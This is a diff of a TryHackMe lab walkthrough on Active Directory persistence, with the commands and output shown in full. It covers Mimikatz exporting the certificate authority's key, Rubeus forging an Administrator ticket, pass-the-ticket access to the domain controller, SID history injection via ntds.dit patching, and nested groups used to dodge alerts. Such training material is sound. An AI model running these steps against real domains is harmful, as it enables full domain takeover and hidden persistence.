- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 
+ .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
+ .## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
+ ## \ / ## > https://blog.gentilkiwi.com/mimikatz
+ '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) 
+ '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ 
 
 mimikatz #
 ```
@@ -589,28 +587,28 @@ Let's first see if we can view the certificates stored on the DC:
 
 ```shell-session
 mimikatz # crypto::certificates /systemstore:local_machine
- * System Store  : 'local_machine' (0x00020000)
- * Store         : 'My'
+ * System Store : 'local_machine' (0x00020000)
+ * Store : 'My'
 
  0.
-    Subject  :
-    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
-    Serial   : 040000000000703a4d78090a0ab10400000010
-    Algorithm: 1.2.840.113549.1.1.1 (RSA)
-    Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
-    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
-        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
-        Provider       : Microsoft RSA SChannel Cryptographic Provider
-        Provider type  : RSA_SCHANNEL (12)
-        Type           : AT_KEYEXCHANGE (0x00000001)
-        |Provider name : Microsoft RSA SChannel Cryptographic Provider
-        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
-        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
-        |Implementation: CRYPT_IMPL_SOFTWARE ;
-        Algorithm      : CALG_RSA_KEYX
-        Key size       : 2048 (0x00000800)
-        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
-        Exportable key : NO
+ Subject :
+ Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
+ Serial : 040000000000703a4d78090a0ab10400000010
+ Algorithm: 1.2.840.113549.1.1.1 (RSA)
+ Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
+ Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
+ Key Container : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
+ Provider : Microsoft RSA SChannel Cryptographic Provider
+ Provider type : RSA_SCHANNEL (12)
+ Type : AT_KEYEXCHANGE (0x00000001)
+ |Provider name : Microsoft RSA SChannel Cryptographic Provider
+ |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
+ |Unique name : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
+ |Implementation: CRYPT_IMPL_SOFTWARE ;
+ Algorithm : CALG_RSA_KEYX
+ Key size : 2048 (0x00000800)
+ Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
+ Exportable key : NO
 [....]
 ```
 
@@ -632,28 +630,28 @@ If you get an error, don't worry, it just means someone else executed the patch 
 
 ```shell-session
 mimikatz # crypto::certificates /systemstore:local_machine /export
- * System Store  : 'local_machine' (0x00020000)
- * Store         : 'My'
+ * System Store : 'local_machine' (0x00020000)
+ * Store : 'My'
 
  0.
-    Subject  :
-    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
-    Serial   : 040000000000703a4d78090a0ab10400000010
-    Algorithm: 1.2.840.113549.1.1.1 (RSA)
-    Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
-    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
-        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
-        Provider       : Microsoft RSA SChannel Cryptographic Provider
-        Provider type  : RSA_SCHANNEL (12)
-        Type           : AT_KEYEXCHANGE (0x00000001)
-        |Provider name : Microsoft RSA SChannel Cryptographic Provider
-        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
-        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
-        |Implementation: CRYPT_IMPL_SOFTWARE ;
-        Algorithm      : CALG_RSA_KEYX
-        Key size       : 2048 (0x00000800)
-        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
-        Exportable key : NO
+ Subject :
+ Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
+ Serial : 040000000000703a4d78090a0ab10400000010
+ Algorithm: 1.2.840.113549.1.1.1 (RSA)
+ Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
+ Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
+ Key Container : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
+ Provider : Microsoft RSA SChannel Cryptographic Provider
+ Provider type : RSA_SCHANNEL (12)
+ Type : AT_KEYEXCHANGE (0x00000001)
+ |Provider name : Microsoft RSA SChannel Cryptographic Provider
+ |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
+ |Unique name : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
+ |Implementation: CRYPT_IMPL_SOFTWARE ;
+ Algorithm : CALG_RSA_KEYX
+ Key size : 2048 (0x00000800)
+ Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
+ Exportable key : NO
 [....]
 ```
 
@@ -666,16 +664,16 @@ za\administrator@THMDC C:\Users\Administrator.ZA\am0>dir
 
  Directory of C:\Tools\x64
 
-05/10/2022  12:12 PM    <DIR>          .
-05/10/2022  12:12 PM    <DIR>          ..
-05/10/2022  12:12 PM             1,423 local_machine_My_0_.der
-05/10/2022  12:12 PM             3,299 local_machine_My_0_.pfx
-05/10/2022  12:12 PM               939 local_machine_My_1_za-THMDC-CA.der
-05/10/2022  12:12 PM             2,685 local_machine_My_1_za-THMDC-CA.pfx
-05/10/2022  12:12 PM             1,534 local_machine_My_2_THMDC.za.tryhackme.loc.der
-05/10/2022  12:12 PM             3,380 local_machine_My_2_THMDC.za.tryhackme.loc.pfx
-05/10/2022  12:12 PM             1,465 local_machine_My_3_.der
-05/10/2022  12:12 PM             3,321 local_machine_My_3_.pfx 
+05/10/2022 12:12 PM <DIR> .
+05/10/2022 12:12 PM <DIR> ..
+05/10/2022 12:12 PM 1,423 local_machine_My_0_.der
+05/10/2022 12:12 PM 3,299 local_machine_My_0_.pfx
+05/10/2022 12:12 PM 939 local_machine_My_1_za-THMDC-CA.der
+05/10/2022 12:12 PM 2,685 local_machine_My_1_za-THMDC-CA.pfx
+05/10/2022 12:12 PM 1,534 local_machine_My_2_THMDC.za.tryhackme.loc.der
+05/10/2022 12:12 PM 3,380 local_machine_My_2_THMDC.za.tryhackme.loc.pfx
+05/10/2022 12:12 PM 1,465 local_machine_My_3_.der
+05/10/2022 12:12 PM 3,321 local_machine_My_3_.pfx 
 ```
 
 The `za-THMDC-CA.pfx` certificate is the one we are particularly interested in. In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`. Download or copy this certificate to your AttackBox using SCP, and then copy it to your low-privileged user's home directory on THMWRK1. You can also perform the rest of the steps on your own non-domain-joined Windows machine if you prefer.
@@ -717,60 +715,60 @@ Once we execute the command, we should receive our TGT:
 
 ```shell-session
 za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
-          ______        _
-         (_____ \      | |
-          _____) )_   _| |__  _____ _   _  ___
-         |  __  /| | | |  _ \| ___ | | | |/___)
-         | |  \ \| |_| | |_) ) ____| |_| |___ |
-         |_|   |_|____/|____/|_____)____/(___/
-       
-         v2.0.0
-       
-       [*] Action: Ask TGT
-       
-       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
-       [*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\Administrator'
-       [+] TGT request successful!
-       [*] base64(ticket.kirbi):
-       
-             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
-       
-         ServiceName              :  krbtgt/za.tryhackme.loc
-         ServiceRealm             :  za.tryhackme.loc
-         UserName                 :  Administrator
-         UserRealm                :  za.tryhackme.loc
-         StartTime                :  2/6/2022 5:54:46 PM
-         EndTime                  :  2/7/2022 3:54:46 AM
-         RenewTill                :  2/13/2022 5:54:46 PM
-         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
-         KeyType                  :  aes256_cts_hmac_sha1
-         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
-         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
+ ______ _
+ (_____ \ | |
+ _____) )_ _| |__ _____ _ _ ___
+ | __ /| | | | _ \| ___ | | | |/___)
+ | | \ \| |_| | |_) ) ____| |_| |___ |
+ |_| |_|____/|____/|_____)____/(___/
+ 
+ v2.0.0
+ 
+ [*] Action: Ask TGT
+ 
+ [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
+ [*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\Administrator'
+ [+] TGT request successful!
+ [*] base64(ticket.kirbi):
+ 
+ doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk
+ MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC
+ BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ
+ nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/
+ MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD
+ zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+7DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr
+ 2Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW
+ ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM
+ Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+0qOZDtgaJZ/neRdRktYhTsGL39VHB5
+ i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/7ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW
+ NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/6NyLjiE9srbOt6hCLzUaOSMGH1Enf
+ SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF
+ CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/4mEjbUN5qjNqejYdUb/b5xw
+ S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG
+ CNdI1/lsICpS/jaK6NM/0oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk
+ RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+
+ f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO
+ hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS
+ n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/2r7ecyrVZIf2Qf0+ci9G
+ vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP
+ iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY
+ 5K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g
+ gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO
+ QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3
+ NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D
+ T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=
+ 
+ ServiceName : krbtgt/za.tryhackme.loc
+ ServiceRealm : za.tryhackme.loc
+ UserName : Administrator
+ UserRealm : za.tryhackme.loc
+ StartTime : 2/6/2022 5:54:46 PM
+ EndTime : 2/7/2022 3:54:46 AM
+ RenewTill : 2/13/2022 5:54:46 PM
+ Flags : name_canonicalize, pre_authent, initial, renewable, forwardable
+ KeyType : aes256_cts_hmac_sha1
+ Base64(key) : Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
+ ASREP (key) : BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
 ```
 
 Now we can use Mimikatz to load the TGT and authenticate to THMDC:
@@ -778,12 +776,12 @@ Now we can use Mimikatz to load the TGT and authenticate to THMDC:
 ```shell-session
 za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\mimikatz_trunk\x64\mimikatz.exe
 
-  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+ .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ## > https://blog.gentilkiwi.com/mimikatz
+ '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
+ '#####' > https://pingcastle.com / https://mysmartlogon.com ***/
 
 mimikatz # kerberos::ptt administrator.kirbi
 
@@ -798,19 +796,19 @@ za\aaron.jones@THMWRK1 C:\Users\aaron.jones>dir \\THMDC.za.tryhackme.loc\c$\
 
  Directory of \\THMDC.za.tryhackme.loc\c$
 
-01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
-04/30/2022  10:24 AM               154 dns_entries.csv
-04/27/2022  10:53 PM           885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
-09/15/2018  08:19 AM    <DIR>          PerfLogs
-03/21/2020  09:31 PM    <DIR>          Program Files
-03/21/2020  09:28 PM    <DIR>          Program Files (x86)
-04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1
-04/25/2022  07:13 PM    <DIR>          tmp
-04/27/2022  08:22 AM    <DIR>          Users
-04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
-04/27/2022  08:12 PM    <DIR>          Windows
-               7 File(s)      2,356,811 bytes
-               7 Dir(s)  50,914,541,568 bytes free
+01/04/2022 08:47 AM 103 delete-vagrant-user.ps1
+04/30/2022 10:24 AM 154 dns_entries.csv
+04/27/2022 10:53 PM 885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
+09/15/2018 08:19 AM <DIR> PerfLogs
+03/21/2020 09:31 PM <DIR> Program Files
+03/21/2020 09:28 PM <DIR> Program Files (x86)
+04/27/2022 08:27 AM 1,423 thm-network-setup-dc.ps1
+04/25/2022 07:13 PM <DIR> tmp
+04/27/2022 08:22 AM <DIR> Users
+04/25/2022 07:11 PM <SYMLINKD> vagrant [\\vboxsvr\vagrant]
+04/27/2022 08:12 PM <DIR> Windows
+ 7 File(s) 2,356,811 bytes
+ 7 Dir(s) 50,914,541,568 bytes free
 ```
 
 ## We Are No Longer Friends With The Blue Team
@@ -834,10 +832,10 @@ The legitimate use case of SID history is to enable access for an account to eff
 
 The thing is, SID history is not restricted to only including SIDs from other domains. With the right permissions, we can just add a SID of our current domain to the SID history of an account we control. Some interesting notes about this persistence technique:
 
-- We normally require Domain Admin privileges or the equivalent thereof to perform this attack.  
+- We normally require Domain Admin privileges or the equivalent thereof to perform this attack. 
 - When the account creates a logon event, the SIDs associated with the account are added to the user's token, which then determines the privileges associated with the account. This includes group SIDs.
 - We can take this attack a step further if we inject the Enterprise Admin SID since this would elevate the account's privileges to effective be Domain Admin in all domains in the forest.
-- Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. Making this a very sneaky method of persistence. We have all the permissions we need to compromise the entire domain (perhaps the entire forest), but our account can simply be a normal user account with membership only to the Domain Users group. We can up the sneakiness to another level by always using this account to alter the SID history of another account, so the initial persistence vector is not as easily discovered and remedied.  
+- Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. Making this a very sneaky method of persistence. We have all the permissions we need to compromise the entire domain (perhaps the entire forest), but our account can simply be a normal user account with membership only to the Domain Users group. We can up the sneakiness to another level by always using this account to alter the SID history of another account, so the initial persistence vector is not as easily discovered and remedied. 
 
 ## Forging History
 
@@ -852,16 +850,16 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 PS C:\Users\Administrator.ZA> Get-ADUser <your ad username> -properties sidhistory,memberof
 
 DistinguishedName : CN=aaron.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
-Enabled           : True
-GivenName         : Aaron
-MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
-Name              : aaron.jones
-ObjectClass       : user
-ObjectGUID        : 7d4c08e5-05b6-45c4-920d-2a6dbba4ca22
-SamAccountName    : aaron.jones
-SID               : S-1-5-21-3885271727-2693558621-2658995185-1429
-SIDHistory        : {}
-Surname           : Jones
+Enabled : True
+GivenName : Aaron
+MemberOf : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
+Name : aaron.jones
+ObjectClass : user
+ObjectGUID : 7d4c08e5-05b6-45c4-920d-2a6dbba4ca22
+SamAccountName : aaron.jones
+SID : S-1-5-21-3885271727-2693558621-2658995185-1429
+SIDHistory : {}
+Surname : Jones
 UserPrincipalName :
 ```
 
@@ -871,13 +869,13 @@ This confirms that our user does not currently have any SID History set. Let's g
 PS C:\Users\Administrator.ZA> Get-ADGroup "Domain Admins"
 
 DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=loc
-GroupCategory     : Security
-GroupScope        : Global
-Name              : Domain Admins
-ObjectClass       : group
-ObjectGUID        : 3a8e1409-c578-45d1-9bb7-e15138f1a922
-SamAccountName    : Domain Admins
-SID               : S-1-5-21-3885271727-2693558621-2658995185-512
+GroupCategory : Security
+GroupScope : Global
+Name : Domain Admins
+ObjectClass : group
+ObjectGUID : 3a8e1409-c578-45d1-9bb7-e15138f1a922
+SamAccountName : Domain Admins
+SID : S-1-5-21-3885271727-2693558621-2658995185-512
 ```
 
 We could use something like Mimikatz to add SID history. However, the latest version of Mimikatz has a flaw that does not allow it to patch LSASS to update SID history. Hence we need to use something else. In this case, we will use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file, the AD database where all information is stored:
@@ -886,7 +884,7 @@ We could use something like Mimikatz to add SID history. However, the latest ver
 ```markup
 PS C:\Users\Administrator.ZA>Stop-Service -Name ntds -force 
 PS C:\Users\Administrator.ZA> Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
-PS C:\Users\Administrator.ZA>Start-Service -Name ntds  
+PS C:\Users\Administrator.ZA>Start-Service -Name ntds 
 ```
 
 The NTDS database is locked when the NTDS service is running. In order to patch our SID history, we must first stop the service. **You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore.**
@@ -962,7 +960,7 @@ In most organisations, there are a significant amount of recursive groups. A rec
 
 While group nesting helps to organise AD, it does reduce the visibility of effective access. Take our IT Support example again. If we query AD for membership of the IT Support group, it would respond with a count of three. However, this count is not really true since it is three groups. To get an idea for effective access, we would now have to enumerate those subgroups as well. But those subgroups can also have subgroups. So the question becomes: "How many layers deep should we enumerate to get the real effective access number?"
 
-This also becomes a monitoring problem. Let's say, for instance, we have an alert that fires off when a new member is added to the Domain Admins group. That is a good alert to have, but it won't fire off if a user is added to a subgroup within the Domain Admins group. This is a very common problem since AD is managed by the AD team, and alerting and monitoring are managed by the InfoSec team. All we need is a little bit of miscommunication, and the alert is no longer valid since subgroups are used.  
+This also becomes a monitoring problem. Let's say, for instance, we have an alert that fires off when a new member is added to the Domain Admins group. That is a good alert to have, but it won't fire off if a user is added to a subgroup within the Domain Admins group. This is a very common problem since AD is managed by the AD team, and alerting and monitoring are managed by the InfoSec team. All we need is a little bit of miscommunication, and the alert is no longer valid since subgroups are used. 
 
 As an attacker, we can leverage this reduced visibility to perform persistence. Instead of targeting the privileged groups that would provide us with access to the environment, we focus our attention on the subgroups instead. Rather than adding ourselves to a privileged group that would raise an alert, we add ourselves to a subgroup that is not being monitored.
 
@@ -1014,19 +1012,19 @@ za\aaron.jones@THMWRK1 C:\Users\aaron.jones>dir \\thmdc.za.tryhackme.loc\c$\
 
  Directory of \\thmdc.za.tryhackme.loc\c$
 
-01/04/2022  08:47 AM               103 delete-vagrant-user.ps1     
-05/01/2022  09:11 AM               169 dns_entries.csv
-09/15/2018  08:19 AM    <DIR>          PerfLogs
-05/11/2022  10:32 AM    <DIR>          Program Files
-03/21/2020  09:28 PM    <DIR>          Program Files (x86)
-05/01/2022  09:17 AM             1,725 thm-network-setup-dc.ps1    
-04/25/2022  07:13 PM    <DIR>          tmp
-05/15/2022  09:16 PM    <DIR>          Tools
-04/27/2022  08:22 AM    <DIR>          Users
-04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant] 
-04/27/2022  08:12 PM    <DIR>          Windows
-               3 File(s)          1,997 bytes
-               8 Dir(s)  51,573,755,904 bytes free
+01/04/2022 08:47 AM 103 delete-vagrant-user.ps1 
+05/01/2022 09:11 AM 169 dns_entries.csv
+09/15/2018 08:19 AM <DIR> PerfLogs
+05/11/2022 10:32 AM <DIR> Program Files
+03/21/2020 09:28 PM <DIR> Program Files (x86)
+05/01/2022 09:17 AM 1,725 thm-network-setup-dc.ps1 
+04/25/2022 07:13 PM <DIR> tmp
+05/15/2022 09:16 PM <DIR> Tools
+04/27/2022 08:22 AM <DIR> Users
+04/25/2022 07:11 PM <SYMLINKD> vagrant [\\vboxsvr\vagrant] 
+04/27/2022 08:12 PM <DIR> Windows
+ 3 File(s) 1,997 bytes
+ 8 Dir(s) 51,573,755,904 bytes free
 ```
 
 Let's also verify that even though we created multiple groups, the Domain Admins group only has one new member:
@@ -1036,21 +1034,21 @@ PS C:\Users\Administrator.ZA> Get-ADGroupMember -Identity "Domain Admins"
 
 
 distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=loc
-name              : Administrator
-objectClass       : user
-objectGUID        : 0bbd7980-b53b-4634-8a28-57e4234655c2
-SamAccountName    : Administrator
-SID               : S-1-5-21-3885271727-2693558621-2658995185-500
+name : Administrator
+objectClass : user
+objectGUID : 0bbd7980-b53b-4634-8a28-57e4234655c2
+SamAccountName : Administrator
+SID : S-1-5-21-3885271727-2693558621-2658995185-500
 
 distinguishedName : CN=Am0 Net Group 5,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc
-name              : Am0 Net Group 5
-objectClass       : group
-objectGUID        : ba545574-6af9-4a3d-a8df-24ab582fc04c
-SamAccountName    : am0_nestgroup5
